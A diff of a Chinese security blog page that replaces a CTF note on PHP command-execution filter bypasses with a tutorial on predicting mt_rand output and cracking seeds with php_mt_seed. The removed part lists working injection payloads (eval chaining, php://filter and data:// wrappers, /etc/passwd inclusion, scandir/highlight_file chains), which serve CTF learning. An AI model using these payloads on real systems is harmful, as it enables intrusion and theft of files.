@@ -16,19 +16,25 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <meta name="description" content="知识梳理最近刷了挺多命令执行的题目，学到了不少新东西，脑子比较乱，在这里整理一下 利用$_GET[]的命令执行1234if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&amp;#x27;&#x2F;i&amp;qu">
+  <meta name="description" content="相关函数mt_srand()： 定义和用法mt_srand() 播种 Mersenne Twister 随机数生成器。 语法1mt_srand(seed)     参数 描述    seed 必需。用 seed 来给随机数发生器播种。   mt_rand()  ：  mt_rand():使用 Mersenne Twister 算法返回随机整数。 语法：mt_rand(min,max); 参数列表：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="命令执行知识整理（1）">
-<meta property="og:url" content="http://example.com/2021/09/16/day1/index.html">
+<meta property="og:title" content="php伪随机数及爆破脚本的使用">
+<meta property="og:url" content="http://example.com/2021/09/20/test4/index.html">
 <meta property="og:site_name" content="LY&#39;s blog">
-<meta property="og:description" content="知识梳理最近刷了挺多命令执行的题目，学到了不少新东西，脑子比较乱，在这里整理一下 利用$_GET[]的命令执行1234if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&amp;#x27;&#x2F;i&amp;qu">
+<meta property="og:description" content="相关函数mt_srand()： 定义和用法mt_srand() 播种 Mersenne Twister 随机数生成器。 语法1mt_srand(seed)     参数 描述    seed 必需。用 seed 来给随机数发生器播种。   mt_rand()  ：  mt_rand():使用 Mersenne Twister 算法返回随机整数。 语法：mt_rand(min,max); 参数列表：">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-09-16T13:10:11.000Z">
-<meta property="article:modified_time" content="2021-09-16T13:06:29.215Z">
+<meta property="og:image" content="http://example.com/test4img/1.png">
+<meta property="og:image" content="http://example.com/test4img/2.png">
+<meta property="og:image" content="http://example.com/test4img/3.png">
+<meta property="og:image" content="http://example.com/test4img/4.png">
+<meta property="og:image" content="http://example.com/test4img/5.png">
+<meta property="article:published_time" content="2021-09-20T14:10:46.000Z">
+<meta property="article:modified_time" content="2021-09-20T13:58:38.124Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/test4img/1.png">
   
-  <title>命令执行知识整理（1） - LY&#39;s blog</title>
+  <title>php伪随机数及爆破脚本的使用 - LY&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -175,7 +181,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="命令执行知识整理（1）">
+            <span class="h2" id="subtitle" title="php伪随机数及爆破脚本的使用">
               
             </span>
 
@@ -185,8 +191,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-09-16 21:10" pubdate>
-        September 16, 2021 pm
+      <time datetime="2021-09-20 22:10" pubdate>
+        September 20, 2021 pm
       </time>
     </span>
   
@@ -196,7 +202,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2k 字
+      1.2k 字
     </span>
   
 
@@ -205,7 +211,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6 分钟
+      4 分钟
     </span>
   
 
@@ -234,46 +240,74 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">命令执行知识整理（1）</h1>
+            <h1 style="display: none">php伪随机数及爆破脚本的使用</h1>
             
             <div class="markdown-body">
-              <h1 id="知识梳理"><a href="#知识梳理" class="headerlink" title="知识梳理"></a>知识梳理</h1><p>最近刷了挺多命令执行的题目，学到了不少新东西，脑子比较乱，在这里整理一下</p>
-<h2 id="利用-GET-的命令执行"><a href="#利用-GET-的命令执行" class="headerlink" title="利用$_GET[]的命令执行"></a>利用$_GET[]的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure>
+              <h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>mt_srand()：</p>
+<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>mt_srand() 播种 Mersenne Twister 随机数生成器。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mt_srand</span><span class="hljs-params">(seed)</span></span><br></code></pre></td></tr></table></figure>
 
-<p>payload:</p>
-<p>c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);</p>
-<p>这样写的好处是通过get参数1来执行cat命令可以绕过对c的正则匹配</p>
-<p>当然也可以使用 echo <code>cat %09 f*</code>这种编码加通配符的方式</p>
-<h2 id="利用include实现的命令执行"><a href="#利用include实现的命令执行" class="headerlink" title="利用include实现的命令执行"></a>利用include实现的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|eval|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">seed</td>
+<td align="left">必需。用 seed 来给随机数发生器播种。</td>
+</tr>
+</tbody></table>
+<p>mt_rand()  ：</p>
+<blockquote>
+<p>mt_rand():使用 Mersenne Twister 算法返回随机整数。</p>
+<p>语法：mt_rand(min,max);</p>
+<p>参数列表：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>min</td>
+<td>可选，范围最小数</td>
+</tr>
+<tr>
+<td>max</td>
+<td>可选，范围最大数</td>
+</tr>
+</tbody></table>
+<p>大概意思就是说通过mt_srand(seed)这个函数分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>首先，我是用php代码生成一段随机数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">123456</span>);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
 
-<p>可以看到这里过滤了反引号、echo、分号等,eval也被禁用了，那单纯使用GET[]的方式肯定是不行了</p>
-<p>payload：</p>
-<p>include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>这里使用php伪协议以base64编码的形式输出flag.php的内容在通过include引入</p>
-<p>这里也考虑过为什么不直接print%09$_GET[1]?&gt;&amp;1=flag.php，这样写多方便</p>
-<p>后来也从别的博客解到了，这样是不行的，二进制分为代码段和数据段，因为这里get传递flag.php的时候不在代码段，只作为字符串传递，输出字符</p>
-<p>利用include还存在一个思路就是包含linux下的/etc/passwd/，它是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读(r)操作。</p>
-<p>include%09$_GET[1]?&gt;&amp;1=/etc/passwd/也是没有问题的</p>
-<p>如果遇到include被过滤的情况可以尝试使用require函数来代替</p>
-<h2 id="利用data伪协议实现的命令执行"><a href="#利用data伪协议实现的命令执行" class="headerlink" title="利用data伪协议实现的命令执行"></a>利用data伪协议实现的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>运行得到结果：</p>
+<p><img src="/test4img/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后在运行一次：</p>
+<p><img src="/test4img/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现两次随机数的结果是一样的，那么我改下代码多输出几次试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">123456</span>);    <br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span>    <br></code></pre></td></tr></table></figure>
 
-<p>这里源码中给出include函数来引入输入</p>
-<p>payload:</p>
-<p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</p>
-<p>data伪协议遇到传入php代码时就会执行php代码，使用base64可以绕过正则匹配，也可以不使用base64用通配符绕过（这里在使用base64时发现了一些问题，在base64编码?&gt;会出现无法被浏览器识别的+导致报错，就可以只保留前面的&lt;?删掉后面的不影响php代码的执行）</p>
-<h2 id="套娃函数命令执行"><a href="#套娃函数命令执行" class="headerlink" title="套娃函数命令执行"></a>套娃函数命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">localeconv()：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)<br><br><br>pos()：返回数组中的当前元素的值。<br>这里也可以换成current()，作用和pos类似<br><br><br>array_reverse()：数组逆序<br><br><br>scandir()：获取目录下的文件<br><br><br>next()： 函数将内部指针指向数组中的下一个元素，并输出<br></code></pre></td></tr></table></figure>
+<p>运行两次：</p>
+<p><img src="/test4img/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现虽然执行时每条随机序列都不一样，但是每次执行的结果却是相同的</p>
+<p>这就是伪随机数的漏洞，生成的伪随机数是线性的，像y=ax+b一样，a就类似于种子，知道伪随机序列后就可以推出种子a</p>
+<h2 id="爆破脚本的利用"><a href="#爆破脚本的利用" class="headerlink" title="爆破脚本的利用"></a>爆破脚本的利用</h2><p>现在官网下载php_mt_seed-PHP mt_rand（）种子破解程序</p>
+<p>[[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/)]">https://www.openwall.com/php_mt_seed/)]</a>: 官网网址</p>
+<p>放到kali里解压：</p>
+<p><img src="/test4img/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>解压之后使用命令更新一下就可以使用了：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">$</span> <span class="hljs-string">make</span><br><span class="hljs-attr">gcc</span> <span class="hljs-string">-Wall -march=native -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed</span><br></code></pre></td></tr></table></figure>
 
-<p>查看目录下的文件名：</p>
-<p>?c=print_r(scandir(pos(localeconv())));</p>
-<p>再用array_reverse()和next()，使指针指向对应的文件，并用highlight_file()输出</p>
-<p>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
-<p>highlight_file函数也可以用show_source函数来代替</p>
-<h2 id="一些过滤的绕过思路"><a href="#一些过滤的绕过思路" class="headerlink" title="一些过滤的绕过思路"></a>一些过滤的绕过思路</h2><p>1、php被过滤时可以利用短标签&lt;?=来代替&lt;?php</p>
-<p>2、空格被过滤时可以用Tab编码替代</p>
-<p>3、liunx .（点命令）：读取并且在当前的shell中执行文件中的命令</p>
-<p>4、通配符</p>
-<p>5、括号被过滤时应该考虑一些不需要括号的语言结构，如：</p>
-<p>echo print isset unset include require</p>
+<p>然后测试一下刚才使用123456种子生成的伪随机数272665632：</p>
+<p><img src="/test4img/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>等待一会就得到了种子，这里爆出了8个种子，再把它带回函数验证就能得到正确的种子123456了</p>
+<p>这里需要注意验证时要对应爆出种子的php版本号，还有在使用爆破脚本时尽量取第一个随机序列，如果不是第一次生成的随机数，爆出来的种子，不一定正确</p>
+<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
 
             </div>
             <hr>
@@ -294,18 +328,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/09/20/test4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">php伪随机数及爆破脚本的使用</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/09/11/test3/">
-                        <span class="hidden-mobile">对字节限制的命令注入总结</span>
+                      <a href="/2021/09/16/day1/">
+                        <span class="hidden-mobile">命令执行知识整理（1）</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
